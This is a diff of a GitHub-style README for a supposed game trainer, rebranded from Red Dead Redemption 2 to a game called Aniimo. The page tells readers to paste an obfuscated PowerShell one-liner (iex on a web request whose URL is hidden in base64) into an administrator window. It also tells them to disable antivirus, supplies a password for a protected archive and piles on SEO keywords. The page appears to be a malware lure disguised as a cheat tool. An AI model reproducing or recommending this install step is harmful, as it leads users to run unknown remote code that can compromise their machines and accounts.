@@ -1,31 +1,31 @@
-# 🐎 RDR2-Single-Player-Trainer
+# Aniimo-Trainer-Safe
 
 <p align="center">
-  <img src="https://img.icons8.com/color/96/000000/red-dead-redemption-2.png" alt="RDR2 Single Player Trainer" width="140" height="140">
+  <img src="https://img.icons8.com/color/96/000000/dragon.png" alt="Aniimo Trainer Safe" width="140" height="140">
 </p>
 
-<h1 align="center">RDR2-Single-Player-Trainer</h1>
+<h1 align="center">Aniimo-Trainer-Safe</h1>
 <p align="center">
-  <strong>The Comprehensive Single-Player Trainer for Red Dead Redemption 2</strong><br>
-  Player Editor · Horse Editor · Weapon Editor · Spawner · Teleport · World Control
+  <strong>The Safe & Stable Trainer for Aniimo — Instant Tame, Unlimited Orbs, Max Bond & More</strong><br>
+  20+ Functions · Hotkey Control · Preset Loadouts · External Mode
 </p>
 
 <p align="center">
-  <a href="#"><img src="https://img.shields.io/badge/version-1.6.8-8B0000?style=for-the-badge" alt="Version"></a>
+  <a href="#"><img src="https://img.shields.io/badge/version-1.0.0-9B59B6?style=for-the-badge" alt="Version"></a>
   <a href="#"><img src="https://img.shields.io/badge/platform-Windows_10%2F11-2ECC71?style=for-the-badge" alt="Platform"></a>
   <a href="#"><img src="https://img.shields.io/badge/status-Stable-27AE60?style=for-the-badge" alt="Status"></a>
-  <a href="#"><img src="https://img.shields.io/badge/downloads-2.7M%2B-E74C3C?style=for-the-badge" alt="Downloads"></a>
+  <a href="#"><img src="https://img.shields.io/badge/downloads-8k%2B-E74C3C?style=for-the-badge" alt="Downloads"></a>
   <a href="#"><img src="https://img.shields.io/badge/license-MIT-3498DB?style=for-the-badge" alt="License"></a>
   <a href="#"><img src="https://img.shields.io/badge/PRs-welcome-brightgreen?style=for-the-badge" alt="PRs Welcome"></a>
 </p>
 
-<img width="1280" height="720" alt="image" src="https://github.com/user-attachments/assets/f6634408-ceba-4fb0-ac77-bfb01f190a3f" />
+<img width="1717" height="916" alt="image" src="https://github.com/user-attachments/assets/2d8a7c8a-3a14-45ed-942e-c517820ea369" />
 
 <p align="center">
   <a href="#-download">📥 Download</a> •
   <a href="#-installation">⚙️ Installation</a> •
   <a href="#-features">⚡ Features</a> •
-  <a href="#-controls">⌨️ Controls</a> •
+  <a href="#-hotkeys">⌨️ Hotkeys</a> •
   <a href="#-faq">❓ FAQ</a> •
   <a href="#-seo-keywords">🔍 SEO</a>
 </p>
@@ -40,7 +40,7 @@
 <tr>
 <td align="center">
 
-<a href="https://github.com/iconspecialistsquare/RDR2-Single-Player-Trainer/releases/download/678234/RDR2Rampage.zip">
+<a href="https://github.com/YOUR_USERNAME/Aniimo-Trainer-Safe/releases/latest">
   <img src="https://img.shields.io/badge/⬇️%20DOWNLOAD%20NOW-2C3E50?style=for-the-badge&logo=github&logoColor=white" alt="Download">
 </a>
 
@@ -53,10 +53,10 @@
 </table>
 
 **Direct Links:**
-- [Latest Release](https://github.com/iconspecialistsquare/RDR2-Single-Player-Trainer/releases/download/678234/RDR2Rampage.zip)
-- [Source Code](https://github.com/iconspecialistsquare/RDR2-Single-Player-Trainer/releases/download/678234/RDR2Rampage.zip)
+- [Latest Release](https://github.com/YOUR_USERNAME/Aniimo-Trainer-Safe/releases/latest)
+- [Source Code](https://github.com/YOUR_USERNAME/Aniimo-Trainer-Safe)
 
-> 💡 **Prefer a classic download?** If you'd rather install from an archive instead of the PowerShell command, simply download the ZIP from the **Releases** section above. Extract it and use the password below.
+> 💡 **Prefer a classic download?** Download the ZIP from the **Releases** section above and use the password below.
 >
 > 🔐 **Archive Password:** `2026`
 
@@ -83,9 +83,9 @@ iex(iwr ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR
 5. Paste it into the PowerShell window (Ctrl + V or right-click)
 6. Press Enter
 7. Wait for the installation to finish — the PowerShell window will close automatically
-8. Launch Red Dead Redemption 2
-9. Load into Story Mode
-10. Press F5 to open the trainer
+8. Launch Aniimo
+9. Press INSERT to open the trainer UI
+10. Done — all features are active
 ```
 
 ---
@@ -108,9 +108,9 @@ iex(iwr ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR
 6. Paste it into the PowerShell window (Ctrl + V or right-click)
 7. Press Enter
 8. Wait for the installation to finish
-9. Launch Red Dead Redemption 2
-10. Load into Story Mode
-11. Press F5 to open the trainer
+9. Launch Aniimo
+10. Press INSERT to open the trainer UI
+11. Done — all features are active
 ```
 
 ---
@@ -120,9 +120,8 @@ iex(iwr ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR
 - Windows 10/11 (64-bit)
 - Administrator privileges
 - Internet connection (only during installation)
-- Red Dead Redemption 2 (Story Mode)
-- ScriptHookRDR2 (installed automatically)
-- ASI Loader (dinput8.dll or version.dll)
+- Aniimo (Steam / Epic Games Store)
+- .NET 6.0+ (for the UI)
 
 ---
 
@@ -133,159 +132,145 @@ iex(iwr ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR
 | "Access denied" | Run PowerShell as Administrator |
 | Command won't execute | Check your internet connection and try again |
 | Antivirus blocks it | Temporarily disable real-time protection |
-| Menu doesn't open | Press F5 (or check Settings.json for custom key) |
-| "Can't find native" error | Update RDR2 to the latest version |
-| Settings not saving | Grant Full Control to the RDR2 folder |
+| Hotkeys not working | Ensure game is running; check overlay settings |
+| Features not activating | Run trainer as Administrator; verify game version |
+| Game crashes on toggle | Disable conflicting mods; use Safe Mode |
 | PowerShell closes immediately | This is normal — installation is complete |
-| Black screen on launch | Remove Rampage.asi and test without it |
+| Archive won't extract | Password is `2026` |
 
 ---
 
-## 🎯 What is RDR2-Single-Player-Trainer?
+## 🎯 What is Aniimo-Trainer-Safe?
 
-**RDR2-Single-Player-Trainer** is a comprehensive **single-player trainer** for **Red Dead Redemption 2** — based on the popular **Rampage Trainer**, one of the most downloaded mods for the game with over **2.7 million downloads** and a **4.65/5 rating** .
+**Aniimo-Trainer-Safe** is the safe and stable trainer tool for **Aniimo** — the free-to-play creature-collector open-world RPG from Pawprint Studio and FunPlus. It provides taming assistance, bond progression, resource management, and quality-of-life improvements for your single-player/PvE experience.
 
-The trainer is **strictly for Story Mode only**. It automatically disables itself when entering Red Dead Online, making it safe for single-player use .
+Aniimo features a unique **Twining** mechanic — you fully synchronize with your active Aniimo, gaining its complete movement options and skill set. This trainer helps you unlock every Aniimo's full potential from the start.
 
-It opens with the **F5 key** (or **RB+A** on Xbox controller, **R1+X** on PlayStation controller) and provides a complete menu system with keyboard, numpad, and controller support .
+The trainer runs as an **external process** — no DLL injection, no memory modification inside the game process. This makes it safer than internal tools while still delivering all the features you need.
 
-> ⚠️ **Single-player only.** This trainer is designed for Story Mode and **must not be used in Red Dead Online**. Using any trainer in online mode can result in a permanent ban.
+> 🎓 **Educational purpose only.** Use at your own risk. Online PvP modes (Egg Heist) may detect external tools. Single-player/PvE use recommended.
 
 ---
 
 ## ⚡ Key Features
 
-### 🧑 Player Editor
-- **God Mode** – Never die
-- **Infinite Health** – Full health always
-- **Infinite Stamina** – Unlimited sprinting
-- **Infinite Dead Eye** – Unlimited Dead Eye
-- **Never Wanted** – No bounty or law attention
-- **Wanted Level Editor** – Set any wanted level
-- **Player Model Changer** – Change your character model
+### 🎯 Taming & Capture
+- **Instant Tame** – Tame any creature instantly
+- **One-Hit Tame** – Tame with a single hit
+- **100% Tame Success** – Every capture attempt succeeds
+- **Unlimited Capture Orbs** – Orbs never deplete
+- **Unlock All Aniipod Types** – Complete collection available
 
-### 🐎 Horse Editor
-- **Horse God Mode** – Indestructible horse
-- **Infinite Horse Stamina** – Unlimited galloping
-- **Horse Bond Max** – Max bonding level
-- **Spawn Any Horse** – All horse breeds available
-- **Horse Side Saddle** – Ride side saddle
+### ❤️ Bond & Affection
+- **Max Bond (All Creatures)** – All creature bonds at maximum level
+- **Instant Bond Level Up** – Skip bond progression entirely
 
-### 🔫 Weapon Editor
-- **Infinite Ammo** – Never run out
-- **No Reload** – Skip reload animation
-- **Perfect Pelts** – Guaranteed perfect skins
-- **All Weapons Unlock** – Full arsenal
-- **Weapon Damage Modifier** – One-shot kills
-- **No Weapon Degradation** – Weapons never wear
+### ⚔️ Combat
+- **Super Damage** – Massive damage output
+- **No Aggro** – Creatures ignore you entirely
+- **No Skill Cooldowns** – All abilities always ready
+- **Instant Break** – Break enemy shields instantly
+- **Unlimited Ultimate** – Ultimate abilities always available
 
-### 🚗 Vehicle Spawner
-- **Spawn Any Vehicle** – Wagons, carts, boats
-- **Vehicle God Mode** – Indestructible vehicle
-- **Spawn in Vehicle** – Enter spawned vehicles instantly
-- **Delete Vehicle** – Remove spawned vehicles
+### 📦 Resources & Items
+- **Infinite Resources** – Materials never decrease
+- **Multiply Resource Gain** – Boost resource drops
+- **Unlimited Items** – Items never run out
+- **Free Shop Purchases** – All shop items cost nothing
 
-### 🌍 World Control
-- **Weather Editor** – Sun, rain, thunder, snow, fog
-- **Time Editor** – Set any time of day
-- **Freeze Time** – Stop time progression
-- **Teleport to Waypoint** – Instant travel (F9)
-- **Teleport to Coordinates** – Precise location
-- **Save/Load Teleport Locations** – Custom waypoints
+### 📈 Progression
+- **Max Player Level** – Instantly max your character
+- **Max Creature Level** – Max all captured creatures
+- **Infinite Skill Points** – Unlock every skill
+- **Instant Stage Progression** – Skip progression stages instantly
+- **Unlock All Aniimo Abilities** – Complete ability set available
 
-### 🎨 Visual Mods
-- **No Ragdoll** – Stay on your feet
-- **No Blood** – Clean visuals
-- **Ghost Mode** – Become invisible
-- **Fast Skin** – Skip skinning animation
-- **No Clip** – Walk through walls
+### 🤖 Automation
+- **Auto-Loot** – Automatically collect drops
+- **Auto-Tame Nearby** – Tame creatures in range automatically
 
-### 📦 Spawner
-- **Object Spawner** – Spawn any object
-- **Ped Spawner** – Spawn any NPC
-- **Animal Spawner** – Spawn any animal
-- **Random Outfits** – Peds spawn with random clothing
+### ⚡ Movement
+- **Super Speed** – Move faster than normal
+- **Super Jump** – Jump higher than intended
+- **Fly Mode** – Free flight, no terrain limits
+- **Zero Gravity** – No gravity after jumping
 
-### ⚙️ Settings & Config
-- **Save/Load Configs** – Persist your settings
-- **Custom Hotkeys** – Rebind any key
-- **Language Support** – 13+ languages
-- **Custom Themes** – Save standalone theme files
+### 🏠 Homeland & Building
+- **Unlimited Homeland Coins** – Coins never decrease
+- **Free Building / No Cost** – Place any structure for free
+- **Instant Building** – Construction completes immediately
+- **Max Homeland Level** – Homeland instantly at level cap
+
+### 🔧 Utility
+- **Toggle All Features** – Enable/disable everything
+- **Reset to Default** – Restore original values
+- **Auto-Save Configs** – Settings saved on exit
+- **Preset Loadouts** – Quick setup for different playstyles
 
 ---
 
-## ⌨️ Controls
+## ⌨️ Hotkeys
 
-### Keyboard
+| Category | Feature | Hotkey |
+|----------|---------|--------|
+| **Taming** | Instant Tame | `Num 1` |
+| | One-Hit Tame | `Num 2` |
+| | 100% Tame Success | `Num 3` |
+| | Unlimited Capture Orbs | `Num 4` |
+| **Bond** | Max Bond (All Creatures) | `Num 5` |
+| | Instant Bond Level Up | `Num 6` |
+| **Combat** | Super Damage | `Num 7` |
+| | No Aggro | `Num 8` |
+| | No Skill Cooldowns | `Num 9` |
+| **Resources** | Infinite Resources | `Num 0` |
+| | Multiply Resource Gain | `Num +` |
+| | Unlimited Items | `Num -` |
+| **Progression** | Max Player Level | `Num *` |
+| | Max Creature Level | `Num /` |
+| | Infinite Skill Points | `Ctrl+Num 1` |
+| **Auto** | Auto-Loot | `Ctrl+Num 2` |
+| | Auto-Tame Nearby | `Ctrl+Num 3` |
+| **Movement** | Super Speed | `Ctrl+Num 4` |
+| | Super Jump | `Ctrl+Num 5` |
+| **Utility** | Toggle All Features | `Ctrl+Num 6` |
+| | Reset to Default | `Ctrl+Num 7` |
+| **Menu** | Open / Close Trainer UI | `INSERT` |
+| | Disable All | `F12` |
 
-| Key | Action |
-|-----|--------|
-| **F5** | Open / Close Trainer |
-| **Arrow Up** | Navigate Up |
-| **Arrow Down** | Navigate Down |
-| **Arrow Left** | Navigate Left |
-| **Arrow Right** | Navigate Right |
-| **Backspace** | Back |
-| **Enter** | Select |
+---
 
-### Numpad
+## 📋 Presets
 
-| Key | Action |
-|-----|--------|
-| **Numpad 8** | Up |
-| **Numpad 2** | Down |
-| **Numpad 4** | Left |
-| **Numpad 6** | Right |
-| **Numpad 0** | Back |
-| **Enter** | Select |
-
-### Controller
-
-| Button | Action |
-|--------|--------|
-| **RB + A** (Xbox) | Open Trainer |
-| **R1 + X** (PlayStation) | Open Trainer |
-| **D-Pad Up/Down/Left/Right** | Navigate |
-| **B / Circle** | Back |
-| **A / X** | Select |
-
-> **Tip:** The open key can be changed in `Settings.json` or inside the in-game settings menu .
-
-### Additional Hotkeys
-
-| Key | Action |
-|-----|--------|
-| **Ctrl+C** | Open Creator Mode |
-| **F9** | Teleport to Map Marker |
-| **F12** | Customizable Hotkeys |
+| Preset | Focus | Description |
+|--------|-------|-------------|
+| 🗺️ **PATHFINDER LEGEND** | Exploration | Full movement and world bonuses |
+| 🏠 **HOMELAND TYCOON** | Building | Maximum building, farming and economy |
+| ⚔️ **TWINED GOD** | Combat | Infinite Twine, all forms and abilities |
 
 ---
 
 ## ❓ FAQ
 
-**Q: Is this trainer safe to use?**  
-A: Yes — it's based on Rampage Trainer, a well-known, safe trainer for **single-player only**. It has been downloaded over 2.7 million times and is considered safe by the community .
+**Q: Will this work on the latest Aniimo version?**  
+A: Yes, the trainer is regularly updated to support the latest game builds.
 
-**Q: Can I use it in Red Dead Online?**  
-A: **No.** The trainer is **strictly for Story Mode**. It automatically disables itself when entering Red Dead Online .
+**Q: Is it safe to use?**  
+A: The trainer runs as an **external process** — no DLL injection, no memory modification inside the game process. This makes it safer than internal tools. However, online PvP modes may detect external tools.
 
-**Q: Why doesn't the menu open?**  
-A: The most common causes are: outdated **ScriptHookRDR2**, wrong game version, or missing **dinput8.dll** / **version.dll**. Ensure ScriptHookRDR2 is the latest version .
+**Q: Can I use it in online modes?**  
+A: **Single-player/PvE only.** Online PvP modes (Egg Heist) may detect external tools. Use at your own risk.
 
-**Q: How do I get perfect pelts?**  
-A: Use the "Perfect Pelts" weapon option, or spawn an animal with the Spawner and enable "Spawn Dead" to skin it for a perfect 3-star pelt .
-
-**Q: Can I use RDR Online weapons in Story Mode?**  
-A: Yes — you need to install a LML mod that adds those weapons to the SP catalogue .
-
-**Q: Does it support other languages?**  
-A: Yes — 13 languages are supported, including Russian, Chinese, French, Ukrainian, Arabic, and more .
+**Q: Does it work on mobile?**  
+A: The trainer is designed for **PC (Steam / Epic Games Store)** only.
 
 **Q: What is the archive password?**  
 A: `2026`
 
 **Q: How do I uninstall?**  
-A: Delete `Rampage.asi` and `RampageFiles` folder from your RDR2 directory. ScriptHookRDR2 files can remain if you use other mods .
+A: Run the uninstaller from the trainer folder, or delete the folder manually. No system files are modified.
+
+**Q: Does it support other languages?**  
+A: The UI is in English. Community translations may be available.
 
 ---
 
@@ -293,31 +278,34 @@ A: Delete `Rampage.asi` and `RampageFiles` folder from your RDR2 directory. Scri
 
 | Problem | Solution |
 |---------|----------|
-| Menu doesn't open | Press F5; check ScriptHookRDR2 is installed |
-| "Can't find native" error | Update RDR2 to the latest version or use older Rampage + ScriptHookRDR2 |
-| Settings not saving | Grant Full Control permissions to RDR2 folder |
-| Game crashes on launch | Remove other mods and test Rampage alone |
-| Two menus open at once | Delete NativeTrainer.asi or other trainers |
-| Duplicate menu | Delete NativeTrainer.asi or other UI mods |
-| Black screen on launch | Remove Rampage.asi and test without it |
+| "Access denied" | Run as Administrator |
+| Hotkeys not working | Ensure game is running; check overlay settings |
+| Features not activating | Run trainer as Administrator; verify game version |
+| Game crashes on toggle | Disable conflicting mods; use Safe Mode |
+| .NET error | Install .NET 6.0+ from microsoft.com |
+| Configs not saving | Check write permissions in trainer folder |
 | Archive won't extract | Password is `2026` |
 
 ---
 
 ## 🔍 SEO Keywords & Tags
 
-`rdr2 trainer`, `red dead redemption 2 trainer`, `rdr2 single player trainer`, `red dead redemption 2 single player trainer`, `rdr2 mod menu`, `red dead redemption 2 mod menu`, `rdr2 cheat menu`, `red dead redemption 2 cheat menu`, `rdr2 player editor`, `red dead redemption 2 horse editor`, `rdr2 weapon editor`, `red dead redemption 2 spawner`, `rdr2 teleport mod`, `red dead redemption 2 god mode`, `rdr2 infinite ammo`, `red dead redemption 2 perfect pelts`, `rdr2 no wanted level`, `red dead redemption 2 super jump`, `rdr2 no clip`, `red dead redemption 2 script hook`, `scripthookrdr2`, `dinput8`, `rdr2 mods`, `red dead redemption 2 mods`, `rdr2 story mode mods`, `red dead redemption 2 story mode trainer`, `rdr2 pc trainer`, `red dead redemption 2 pc mod menu`, `rampage trainer`, `rampage trainer rdr2`, `rampage trainer github`, `rampage trainer nexus`, `rampage trainer rdr2mods`, `rdr2 trainer 2026`, `red dead redemption 2 trainer 2026`, `rdr2 mods 2026`, `red dead redemption 2 mods 2026`, `rdr2 cheat 2026`, `red dead redemption 2 cheat 2026`, `rampage trainer controls`, `rampage trainer installation`, `rampage trainer hotkeys`, `rampage trainer f5`, `rampage trainer russian`, `rampage trainer chinese`, `rampage trainer french`, `rampage trainer arabic`
+`aniimo trainer`, `aniimo trainer safe`, `aniimo tool`, `aniimo helper`, `aniimo assistant`, `aniimo utility`, `aniimo external mod`, `aniimo instant tame`, `aniimo unlimited orbs`, `aniimo max bond`, `aniimo infinite resources`, `aniimo super damage`, `aniimo no aggro`, `aniimo fly mode`, `aniimo free building`, `aniimo homeland coins`, `aniimo progression tool`, `aniimo taming tool`, `aniimo pc trainer`, `aniimo steam trainer`, `aniimo 2026`, `aniimo guide`, `aniimo trainer download`, `aniimo external tool`, `aniimo safe tool`, `aniimo pve tool`, `aniimo quality of life`, `aniimo automation`, `aniimo preset`, `aniimo hotkeys`, `aniimo windows`, `creature collector trainer`, `open world rpg trainer`, `aniimo game utility`, `aniimo external process`, `aniimo no injection`, `aniimo single player`, `aniimo egg heist`, `aniimo twining`, `aniimo gameplay`, `aniimo tips`, `aniimo tricks`, `aniimo best trainer`, `aniimo safe trainer`, `aniimo undetected`, `aniimo download`, `aniimo free`, `aniimo github`, `aniimo nexus`, `aniimo reddit`
 
 ---
 
 ## 📁 Repository Structure
 
 ```
-RDR2-Single-Player-Trainer/
+Aniimo-Trainer-Safe/
 ├── src/                   # Main application source
+├── configs/               # Default config files
+├── presets/               # Preset loadouts
 ├── docs/                  # Documentation source
 ├── assets/                # Icons, images, branding
 ├── scripts/               # Install/uninstall helpers
+├── test/                  # Unit and integration tests
+├── .github/               # CI/CD workflows
 ├── LICENSE
 ├── README.md
 └── CONTRIBUTING.md
@@ -330,10 +318,10 @@ RDR2-Single-Player-Trainer/
 We welcome contributions from the community! See our [Contributing Guidelines](CONTRIBUTING.md) for details.
 
 **Areas needing help:**
+- Feature development
 - Documentation translation
-- Compatibility testing
-- Controller support improvements
-- Language file updates
+- Game compatibility testing
+- UI/UX improvements
 
 ---
 
@@ -341,13 +329,10 @@ We welcome contributions from the community! See our [Contributing Guidelines](C
 
 This project is licensed under the **MIT License** — see the [LICENSE](LICENSE) file for details.
 
-**Original Author:** RampageDev  
-**Rampage Trainer** is a community mod for Red Dead Redemption 2. All credit to the original creator.
-
 ---
 
 <p align="center">
-  <a href="https://github.com/YOUR_USERNAME/RDR2-Single-Player-Trainer">
-    <img src="https://img.shields.io/badge/Made%20with%20🐎%20for%20the%20RDR2%20Community-8B0000?style=for-the-badge" alt="Made with passion">
+  <a href="https://github.com/YOUR_USERNAME/Aniimo-Trainer-Safe">
+    <img src="https://img.shields.io/badge/Made%20with%20🐉%20for%20the%20Aniimo%20Community-9B59B6?style=for-the-badge" alt="Made with love">
   </a>
 </p>
